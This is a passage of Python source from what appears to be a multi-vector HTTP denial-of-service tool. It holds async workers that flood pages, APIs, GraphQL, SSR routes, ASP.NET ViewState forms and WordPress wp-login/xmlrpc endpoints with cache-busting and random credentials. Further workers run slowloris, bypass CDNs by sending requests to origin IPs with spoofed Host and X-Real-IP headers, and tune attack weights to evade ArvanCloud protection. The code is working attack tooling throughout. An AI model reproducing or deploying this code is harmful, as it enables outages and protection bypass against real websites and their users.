                headers["If-Modified-Since"] = "Sat, 01 Jan 2000 00:00:00 GMT"
                headers["If-None-Match"] = f'W/"{random.randint(100000,999999)}"'
                # Random Accept header variations
                accept_types = [
                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "application/json, text/javascript, */*; q=0.01",
                    "text/plain, */*",
                    "*/*",
                ]
                headers["Accept"] = random.choice(accept_types)
                
                async with session.get(url_trick, headers=headers, ssl=False,
                                       allow_redirects=True) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    # Check if we hit origin (no CDN cache headers)
                    hit_origin = "x-cache" not in {k.lower(): v for k, v in resp.headers.items()}
                    hint_suffix = " ORIGIN!" if hit_origin else ""
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="cache_decep", hint=f"CacheDec {resp.status}{hint_suffix} ({len(body):,}B)", url=url_trick[:60])
                    await self.live_log.add("cache_decep", resp.status, elapsed, None, self.url, result.hint)
                    self.health_monitor.record(result)
            except asyncio.TimeoutError:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cache_decep", err="Timeout", url=self.url)
                await self.live_log.add("cache_decep", None, result.rt, "Timeout", self.url)
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cache_decep", err=type(e).__name__, url=self.url)
                await self.live_log.add("cache_decep", None, result.rt, type(e).__name__, self.url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_origin_direct(self, session, delay=0):
        """Origin direct attack — bypass CDN by hitting the real server IP directly"""
        if delay > 0: await asyncio.sleep(delay)
        origin_ips = self.profile.get("origin_ips", [])
        if not origin_ips:
            return  # No origin IPs found
        
        consecutive_fails = 0
        while not self._stop.is_set():
            t = time.time()
            try:
                origin_ip = random.choice(origin_ips)
                # Build URL pointing to origin IP with Host header
                origin_url = self.url.replace(self.profile.get("host", ""), origin_ip)
                
                headers = self._base_headers()
                headers["Host"] = self.profile.get("domain", self.site_root.replace("https://", "").replace("http://", ""))
                headers["X-Forwarded-Host"] = self.profile.get("domain", "")
                headers["X-Forwarded-Proto"] = "https"
                headers["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                
                # Use ssl=False since origin IP won't match certificate
                async with session.get(origin_url, headers=headers, ssl=False,
                                       allow_redirects=False) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="origin", hint=f"Origin {resp.status} via {origin_ip} ({len(body):,}B)", url=origin_url[:60])
                    await self.live_log.add("origin", resp.status, elapsed, None, self.url, result.hint)
                    self.health_monitor.record(result)
            except asyncio.TimeoutError:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="origin", err="Timeout", url=self.url)
                await self.live_log.add("origin", None, result.rt, "Timeout", self.url)
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="origin", err=type(e).__name__, url=self.url)
                await self.live_log.add("origin", None, result.rt, type(e).__name__, self.url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_api(self, session, endpoints, delay=0):
        """API endpoint flooding worker"""
        if delay > 0: await asyncio.sleep(delay)
        if not endpoints: return
        consecutive_fails = 0
        while not self._stop.is_set():
            endpoint = random.choice(endpoints)
            url = endpoint if endpoint.startswith('http') else f"{self.site_root}{endpoint}"
            t = time.time()
            try:
                busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
                headers = {**self._base_headers(), "Accept": "application/json"}
                # Randomly choose GET or POST
                if random.random() > 0.6:
                    payload = json.dumps({"data": rand_user(), "id": random.randint(1, 99999)})
                    headers["Content-Type"] = "application/json"
                    async with session.post(busted, headers=headers, data=payload,
                                           ssl=False, allow_redirects=False) as resp:
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="api", hint=f"API POST {resp.status}", url=url)
                        await self.live_log.add("api", resp.status, elapsed, None, url, result.hint)
                else:
                    async with session.get(busted, headers=headers,
                                           ssl=False, allow_redirects=True) as resp:
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="api", hint=f"API GET {resp.status}", url=url)
                        await self.live_log.add("api", resp.status, elapsed, None, url, result.hint)
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="api", err=type(e).__name__, url=url)
                await self.live_log.add("api", None, result.rt, type(e).__name__, url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    # ─── SPA-Specific Attack Workers ──────────────────────────────────────────

    async def _worker_graphql(self, session, endpoint, delay=0):
        """GraphQL-specific flooding worker — sends complex nested queries"""
        if delay > 0: await asyncio.sleep(delay)
        if not endpoint: return
        consecutive_fails = 0

        # GraphQL query templates — from simple to deeply nested
        graphql_queries = [
            '{"query":"{ __schema { types { name fields { name type { name } } } } }"}',
            '{"query":"{ users { id name email posts { id title comments { id body author { id name } } } } }"}',
            '{"query":"{ products { id name price reviews { id rating body author { id name } } category { id name products { id } } } }"}',
            f'{{"query":"{{ search(query:\\"{rand_user()}\\") {{ id title description content {{ ... on User {{ email posts {{ id }} }} ... on Post {{ body author {{ name }} }} }} }} }}"}}',
            f'{{"query":"mutation {{ createPost(input: {{ title:\\"{rand_user()}\\", body:\\"{rand_pass()}\\", authorId:{random.randint(1,999)} }}) {{ id title }} }}"}}',
        ]

        while not self._stop.is_set():
            t = time.time()
            try:
                query = random.choice(graphql_queries)
                headers = {**self._base_headers(),
                          "Content-Type": "application/json",
                          "Accept": "application/json"}
                busted = f"{endpoint}{'&' if '?' in endpoint else '?'}{rand_cache_bust()}"
                async with session.post(busted, headers=headers, data=query,
                                       ssl=False, allow_redirects=False) as resp:
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="api", hint=f"GQL {resp.status}", url=endpoint)
                    await self.live_log.add("api", resp.status, elapsed, None, endpoint, result.hint)
                    self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="api",
                                  err=type(e).__name__, url=endpoint)
                await self.live_log.add("api", None, result.rt, type(e).__name__, endpoint)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_spa_route(self, session, routes, delay=0):
        """SPA Route Flood — hits client-side routes that trigger API calls"""
        if delay > 0: await asyncio.sleep(delay)
        if not routes: routes = [self.url]
        consecutive_fails = 0

        while not self._stop.is_set():
            route = random.choice(routes)
            url = route if route.startswith('http') else f"{self.site_root}{route}"
            t = time.time()
            try:
                api_url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
                headers = {**self._base_headers(),
                          "Accept": "application/json, text/plain, */*",
                          "X-Requested-With": "XMLHttpRequest"}
                async with session.get(api_url, headers=headers,
                                       ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="page", hint=f"SPA {resp.status} ({len(body):,}B)", url=url)
                    await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
                    self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
                                  err=type(e).__name__, url=url)
                await self.live_log.add("page", None, result.rt, type(e).__name__, url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_ssr_render(self, session, routes, delay=0):
        """SSR Render Flood — forces server-side rendering on Next.js/SSR pages"""
        if delay > 0: await asyncio.sleep(delay)
        if not routes: routes = [self.url]
        consecutive_fails = 0

        while not self._stop.is_set():
            route = random.choice(routes)
            url = route if route.startswith('http') else f"{self.site_root}{route}"
            t = time.time()
            try:
                busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
                headers = {**self._base_headers(),
                          "Accept": "text/html,application/xhtml+xml",
                          "Cache-Control": "no-cache, no-store, must-revalidate",
                          "Pragma": "no-cache"}
                async with session.get(busted, headers=headers,
                                       ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="page", hint=f"SSR {resp.status} ({len(body):,}B)", url=url)
                    await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
                    self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
                                  err=type(e).__name__, url=url)
                await self.live_log.add("page", None, result.rt, type(e).__name__, url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_viewstate(self, session, delay=0):
        """ASP.NET ViewState flooding worker — sends POST requests with fresh ViewState"""
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        while not self._stop.is_set():
            t = time.time()
            try:
                hidden_fields = await self._refresh_viewstate(session)
                # Send POST with ViewState but random data
                form_data = {**hidden_fields,
                            self.username_field: rand_user(),
                            self.password_field: rand_pass(),
                            "__EVENTTARGET": "",
                            "__EVENTARGUMENT": "",}
                headers = {**self._base_headers(),
                          "Content-Type": "application/x-www-form-urlencoded",
                          "Origin": self.site_root, "Referer": self.url}
                async with session.post(self.url, headers=headers, data=form_data,
                                       ssl=False, allow_redirects=False) as resp:
                    body = await resp.text()
                    elapsed = time.time() - t
                    # Detect "invalid" in response — force ViewState refresh
                    if "invalid" in body.lower():
                        self._invalid_count += 1
                        self._viewstate_ts = 0  # Force immediate refresh
                    vs_size = len(hidden_fields.get('__VIEWSTATE', ''))
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="viewstate", hint=f"VS {resp.status} ({vs_size}B)", url=self.url)
                    await self.live_log.add("viewstate", resp.status, elapsed, None, self.url, result.hint)
                    self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="viewstate", err=type(e).__name__)
                await self.live_log.add("viewstate", None, result.rt, type(e).__name__, self.url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 8)), 30.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    async def _worker_wp(self, session, wp_config, delay=0):
        """WordPress-specific attack worker (xmlrpc + wp-login)"""
        if delay > 0: await asyncio.sleep(delay)
        consecutive_fails = 0
        login_url = wp_config.get("login_url", f"{self.site_root}/wp-login.php")
        xmlrpc_url = wp_config.get("xmlrpc_url", f"{self.site_root}/xmlrpc.php")

        while not self._stop.is_set():
            t = time.time()
            try:
                if random.random() > 0.5:
                    # wp-login.php flood
                    form_data = {
                        "log": rand_user(),
                        "pwd": rand_pass(),
                        "wp-submit": "Log In",
                        "redirect_to": "/wp-admin/",
                        "testcookie": "1",
                    }
                    headers = {**self._base_headers(),
                              "Content-Type": "application/x-www-form-urlencoded",
                              "Referer": login_url, "Origin": self.site_root}
                    async with session.post(login_url, headers=headers, data=form_data,
                                           ssl=False, allow_redirects=False) as resp:
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="wp", hint=f"WP-Login {resp.status}", url=login_url)
                        await self.live_log.add("wp", resp.status, elapsed, None, login_url, result.hint)
                else:
                    # xmlrpc.php flood
                    xml = f"""<?xml version="1.0"?>
                    <methodCall><methodName>wp.getUsersBlogs</methodName>
                    <params><param><value>{rand_user()}</value></param>
                    <param><value>{rand_pass()}</value></param></params></methodCall>"""
                    headers = {**self._base_headers(), "Content-Type": "text/xml"}
                    async with session.post(xmlrpc_url, headers=headers, data=xml,
                                           ssl=False, allow_redirects=False) as resp:
                        elapsed = time.time() - t
                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                          mode="wp", hint=f"XMLRPC {resp.status}", url=xmlrpc_url)
                        await self.live_log.add("wp", resp.status, elapsed, None, xmlrpc_url, result.hint)
                self.health_monitor.record(result)
            except Exception as e:
                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="wp", err=type(e).__name__)
                await self.live_log.add("wp", None, result.rt, type(e).__name__, self.url)
                self.health_monitor.record(result)
            self._record(result)
            if not result.ok:
                consecutive_fails += 1
                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
            else:
                consecutive_fails = 0
                await asyncio.sleep(self.request_delay_ms / 1000)

    def _record(self, r: HitResult):
        self.stats.total += 1
        self.stats.rts.append(r.rt)
        self.stats._recent.append(r)
        if r.ok: self.stats.ok += 1
        else: self.stats.fail += 1
        if r.code: self.stats.codes[r.code] = self.stats.codes.get(r.code, 0) + 1
        if r.mode == "login":
            if r.ok:
                self.stats.login_ok += 1
            else:
                self.stats.login_fail += 1
        elif r.mode == "page": self.stats.page_hits += 1
        elif r.mode == "resource": self.stats.resource_hits += 1
        elif r.mode == "slowloris": self.stats.slowloris_hits += 1
        elif r.mode == "api": self.stats.api_hits += 1
        elif r.mode == "viewstate": self.stats.viewstate_hits += 1
        elif r.mode == "wp": self.stats.wp_hits += 1
        elif r.mode == "slow_post": self.stats.slow_post_hits += 1
        elif r.mode == "h2mux": self.stats.h2mux_hits += 1
        elif r.mode == "cache_decep": self.stats.cache_decep_hits += 1
        elif r.mode == "origin": self.stats.origin_hits += 1
        elif r.mode == "graphql": self.stats.graphql_hits += 1
        elif r.mode == "spa_route": self.stats.spa_route_hits += 1
        elif r.mode == "ssr_render": self.stats.ssr_render_hits += 1

    async def _persistent_worker(self, session, vectors, pages, resources, delay=0):
        """Persistent worker wrapper — respawns inner workers when they die"""
        if delay > 0: await asyncio.sleep(delay)
        while not self._stop.is_set():
            try:
                # Pick a random worker type and run it once (single cycle)
                # Instead of infinite loop, each worker type does one request
                r = random.random()
                is_spa = self.attack.get("spa_config", {}).get("enabled", False)
                
                if is_spa:
                    weights = self.attack.get("spa_config", {}).get("worker_weights", {})
                    login_pct = weights.get("login_pct", 0.05)
                    page_pct = 0
                    resource_pct = weights.get("resource_pct", 0.05)
                    slowloris_pct = weights.get("slowloris_pct", 0.05)
                    api_pct = weights.get("api_pct", 0.40)
                    graphql_pct = weights.get("graphql_pct", 0.20)
                    spa_route_pct = weights.get("spa_route_pct", 0.15)
                    ssr_render_pct = weights.get("ssr_render_pct", 0.10)
                    viewstate_pct = 0
                    wp_pct = 0
                    slow_post_pct = weights.get("slow_post_pct", 0.05)
                    h2mux_pct = weights.get("h2mux_pct", 0.05)
                    cache_decep_pct = weights.get("cache_decep_pct", 0.05)
                    origin_pct = weights.get("origin_pct", 0.03)
                else:
                    login_pct = 0.40
                    page_pct = 0.20
                    resource_pct = 0.15
                    slowloris_pct = 0.05
                    api_pct = 0.05 if self.has_api else 0
                    graphql_pct = 0
                    spa_route_pct = 0
                    ssr_render_pct = 0
                    viewstate_pct = 0.10 if self.is_aspnet else 0
                    wp_pct = 0.10 if self.is_wordpress else 0
                    # ArvanCloud/CDN bypass workers
                    slow_post_pct = 0.05 if (self.detected_waf and "arvan" in (self.detected_waf or "").lower()) else 0
                    h2mux_pct = 0.05 if (self.detected_waf and "arvan" in (self.detected_waf or "").lower()) else 0
                    cache_decep_pct = 0.08 if (self.detected_waf and "arvan" in (self.detected_waf or "").lower()) else 0
                    origin_pct = 0.10 if self.profile.get("origin_ips") else 0

                total = login_pct + page_pct + resource_pct + slowloris_pct + api_pct + graphql_pct + spa_route_pct + ssr_render_pct + viewstate_pct + wp_pct + slow_post_pct + h2mux_pct + cache_decep_pct + origin_pct
                if total == 0: total = 1
                login_pct /= total; page_pct /= total; resource_pct /= total
                slowloris_pct /= total; api_pct /= total; graphql_pct /= total
                spa_route_pct /= total; ssr_render_pct /= total
                viewstate_pct /= total; wp_pct /= total
                slow_post_pct /= total; h2mux_pct /= total; cache_decep_pct /= total; origin_pct /= total

                cumulative = 0
                chosen = "page"

                cumulative += api_pct
                if r < cumulative: chosen = "api"
                else:
                    cumulative += graphql_pct
                    if r < cumulative: chosen = "graphql"
                    else:
                        cumulative += spa_route_pct
                        if r < cumulative: chosen = "spa_route"
                        else:
                            cumulative += ssr_render_pct
                            if r < cumulative: chosen = "ssr_render"
                            else:
                                cumulative += login_pct
                                if r < cumulative: chosen = "login"
                                else:
                                    cumulative += page_pct
                                    if r < cumulative: chosen = "page"
                                    else:
                                        cumulative += resource_pct
                                        if r < cumulative: chosen = "resource"
                                        else:
                                            cumulative += slowloris_pct
                                            if r < cumulative: chosen = "slowloris"
                                            else:
                                                cumulative += viewstate_pct
                                                if r < cumulative: chosen = "viewstate"
                                                else:
                                                    cumulative += wp_pct
                                                    if r < cumulative: chosen = "wp"
                                                    else:
                                                        cumulative += slow_post_pct
                                                        if r < cumulative: chosen = "slow_post"
                                                        else:
                                                            cumulative += h2mux_pct
                                                            if r < cumulative: chosen = "h2mux"
                                                            else:
                                                                cumulative += cache_decep_pct
                                                                if r < cumulative: chosen = "cache_decep"
                                                                else:
                                                                    cumulative += origin_pct
                                                                    if r < cumulative: chosen = "origin"

                # Execute a single request cycle
                if chosen == "login":
                    await self._single_login(session)
                elif chosen == "page":
                    await self._single_page(session, pages)
                elif chosen == "resource":
                    if resources:
                        await self._single_resource(session, resources)
                    else:
                        await self._single_page(session, pages)
                elif chosen == "slowloris":
                    await self._single_slowloris(session)
                elif chosen == "api":
                    endpoints = self.profile.get("api_endpoints", []) or self.attack.get("api_config", {}).get("endpoints", [])
                    if endpoints:
                        await self._single_api(session, endpoints)
                    else:
                        await self._single_page(session, pages)
                elif chosen == "viewstate":
                    await self._single_viewstate(session)
                elif chosen == "wp":
                    wp_config = self.attack.get("wordpress_config", {})
                    await self._single_wp(session, wp_config)
                elif chosen == "slow_post":
                    await self._single_slow_post_read(session)
                elif chosen == "h2mux":
                    await self._single_http2_multiplex(session)
                elif chosen == "cache_decep":
                    await self._single_cache_deception(session)
                elif chosen == "origin":
                    await self._single_origin_direct(session)
                elif chosen == "graphql":
                    endpoints = self.profile.get("api_endpoints", []) or self.attack.get("api_config", {}).get("endpoints", [])
                    gql_endpoint = self.attack.get("spa_config", {}).get("graphql_endpoint", "")
                    if gql_endpoint:
                        await self._single_graphql(session, gql_endpoint)
                    elif endpoints:
                        await self._single_graphql(session, endpoints[0])
                    else:
                        await self._single_api(session, [self.url])
                elif chosen == "spa_route":
                    routes = self.attack.get("spa_config", {}).get("spa_routes", [])
                    await self._single_spa_route(session, routes)
                elif chosen == "ssr_render":
                    routes = self.attack.get("spa_config", {}).get("ssr_routes", [])
                    await self._single_ssr_render(session, routes)
                else:
                    await self._single_page(session, pages)

                # Small delay between requests
                if not self._stop.is_set():
                    await asyncio.sleep(self.request_delay_ms / 1000)

            except asyncio.CancelledError:
                break
            except Exception as e:
                # Worker crashed — log and respawn after short delay
                if not self._stop.is_set():
                    await asyncio.sleep(0.1)

    # ─── SPA-Specific Single Request Methods ──────────────────────────────

    async def _single_graphql(self, session, endpoint):
        """Single GraphQL request cycle"""
        if not endpoint:
            await self._single_api(session, [self.url])
            return
        t = time.time()
        try:
            graphql_queries = [
                '{"query":"{ __schema { types { name } } }"}',
                '{"query":"{ users { id name email } }"}',
                f'{{"query":"{{ search(query:\\"{rand_user()}\\") {{ id title }} }}"}}',
                f'{{"query":"mutation {{ createPost(input: {{ title:\\"{rand_user()}\\", body:\\"{rand_pass()}\\" }}) {{ id }} }}"}}',
            ]
            query = random.choice(graphql_queries)
            headers = {**self._base_headers(),
                      "Content-Type": "application/json",
                      "Accept": "application/json"}
            url = endpoint if endpoint.startswith('http') else f"{self.site_root}{endpoint}"
            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}"
            async with session.post(busted, headers=headers, data=query,
                                   ssl=False, allow_redirects=False) as resp:
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="graphql", hint=f"GQL {resp.status}", url=url)
                await self.live_log.add("graphql", resp.status, elapsed, None, url, result.hint)
                self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="graphql",
                              err=type(e).__name__, url=endpoint)
            await self.live_log.add("graphql", None, result.rt, type(e).__name__, endpoint)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_spa_route(self, session, routes):
        """Single SPA route request cycle"""
        if not routes: routes = [self.url]
        t = time.time()
        route = random.choice(routes)
        url = route if route.startswith('http') else f"{self.site_root}{route}"
        try:
            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
            headers = {**self._base_headers(),
                      "Accept": "application/json, text/plain, */*",
                      "X-Requested-With": "XMLHttpRequest"}
            async with session.get(busted, headers=headers,
                                   ssl=False, allow_redirects=True) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="spa_route", hint=f"SPA {resp.status} ({len(body):,}B)", url=url)
                await self.live_log.add("spa_route", resp.status, elapsed, None, url, result.hint)
                self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="spa_route",
                              err=type(e).__name__, url=url)
            await self.live_log.add("spa_route", None, result.rt, type(e).__name__, url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_ssr_render(self, session, routes):
        """Single SSR render request cycle — forces server-side rendering"""
        if not routes: routes = [self.url]
        t = time.time()
        route = random.choice(routes)
        url = route if route.startswith('http') else f"{self.site_root}{route}"
        try:
            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
            headers = {**self._base_headers(),
                      "Accept": "text/html,application/xhtml+xml",
                      "Cache-Control": "no-cache, no-store, must-revalidate",
                      "Pragma": "no-cache"}
            async with session.get(busted, headers=headers,
                                   ssl=False, allow_redirects=True) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="ssr_render", hint=f"SSR {resp.status} ({len(body):,}B)", url=url)
                await self.live_log.add("ssr_render", resp.status, elapsed, None, url, result.hint)
                self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="ssr_render",
                              err=type(e).__name__, url=url)
            await self.live_log.add("ssr_render", None, result.rt, type(e).__name__, url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_login(self, session):
        """Single login attempt"""
        t = time.time()
        try:
            hidden_fields = await self._refresh_viewstate(session) if self.is_aspnet else {}
            form_data = {**hidden_fields,
                        self.username_field: rand_user(),
                        self.password_field: rand_pass()}
            headers = {**self._base_headers(),
                      "Content-Type": "application/x-www-form-urlencoded",
                      "Origin": self.site_root, "Referer": self.url}
            async with session.post(self.url, headers=headers, data=form_data,
                                   ssl=False, allow_redirects=False) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                if "invalid" in body.lower():
                    self._invalid_count += 1
                    self._viewstate_ts = 0
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="login", hint=f"Login {resp.status}", url=self.url)
                await self.live_log.add("login", resp.status, elapsed, None, self.url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err="Timeout")
            await self.live_log.add("login", None, result.rt, "Timeout", self.url)
            self.health_monitor.record(result)
        except Exception as e:
            msg = type(e).__name__
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=msg)
            await self.live_log.add("login", None, result.rt, msg, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_page(self, session, pages):
        """Single page request"""
        if not pages: pages = [self.url]
        url = random.choice(pages)
        t = time.time()
        try:
            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
            async with session.get(busted, headers=self._base_headers(),
                                   ssl=False, allow_redirects=True) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="page", hint=f"Page {resp.status} ({len(body):,}B)", url=url)
                await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err="Timeout", url=url)
            await self.live_log.add("page", None, result.rt, "Timeout", url)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err=type(e).__name__, url=url)
            await self.live_log.add("page", None, result.rt, type(e).__name__, url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_resource(self, session, resources):
        """Single resource request"""
        if not resources:
            await self._single_page(session, [self.url])
            return
        url = random.choice(resources)
        t = time.time()
        try:
            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
            headers = {"User-Agent": random_ua(), "Accept": "*/*", "Connection": "keep-alive"}
            async with session.get(busted, headers=headers, ssl=False) as resp:
                data = await resp.read()
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="resource", hint=f"Res {resp.status} ({len(data):,}B)", url=url)
                await self.live_log.add("resource", resp.status, elapsed, None, url, result.hint)
                self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="resource", err=type(e).__name__, url=url)
            await self.live_log.add("resource", None, result.rt, type(e).__name__, url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_slowloris(self, session):
        """Single slowloris request"""
        t = time.time()
        try:
            headers = self._base_headers()
            headers["Content-Length"] = str(random.randint(10000, 100000))
            async with session.get(self.url, headers=headers, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=30),
                                   allow_redirects=False) as resp:
                await asyncio.sleep(random.uniform(2, 8))
                elapsed = time.time() - t
                result = HitResult(ok=True, code=resp.status, rt=elapsed, mode="slowloris",
                                  hint=f"Slow {elapsed:.1f}s", url=self.url)
                await self.live_log.add("slowloris", resp.status, elapsed, None, self.url, result.hint)
        except asyncio.TimeoutError:
            elapsed = time.time() - t
            result = HitResult(ok=True, code=None, rt=elapsed, mode="slowloris",
                              hint=f"Slow timeout {elapsed:.1f}s", url=self.url)
            await self.live_log.add("slowloris", None, elapsed, None, self.url, "timeout")
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowloris", err=type(e).__name__)
            await self.live_log.add("slowloris", None, result.rt, type(e).__name__, self.url)
        self.health_monitor.record(result)
        self._record(result)

    async def _single_api(self, session, endpoints):
        """Single API request"""
        endpoint = random.choice(endpoints)
        url = endpoint if endpoint.startswith('http') else f"{self.site_root}{endpoint}"
        t = time.time()
        try:
            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
            headers = {**self._base_headers(), "Accept": "application/json"}
            if random.random() > 0.6:
                payload = json.dumps({"data": rand_user(), "id": random.randint(1, 99999)})
                headers["Content-Type"] = "application/json"
                async with session.post(busted, headers=headers, data=payload,
                                       ssl=False, allow_redirects=False) as resp:
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="api", hint=f"API POST {resp.status}", url=url)
                    await self.live_log.add("api", resp.status, elapsed, None, url, result.hint)
            else:
                async with session.get(busted, headers=headers,
                                       ssl=False, allow_redirects=True) as resp:
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="api", hint=f"API GET {resp.status}", url=url)
                    await self.live_log.add("api", resp.status, elapsed, None, url, result.hint)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="api", err=type(e).__name__, url=url)
            await self.live_log.add("api", None, result.rt, type(e).__name__, url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_viewstate(self, session):
        """Single ViewState flood request"""
        t = time.time()
        try:
            hidden_fields = await self._refresh_viewstate(session)
            form_data = dict(hidden_fields)
            vs_size = len(json.dumps(form_data))
            headers = {**self._base_headers(),
                      "Content-Type": "application/x-www-form-urlencoded",
                      "Origin": self.site_root, "Referer": self.url}
            async with session.post(self.url, headers=headers, data=form_data,
                                   ssl=False, allow_redirects=False) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                if "invalid" in body.lower():
                    self._invalid_count += 1
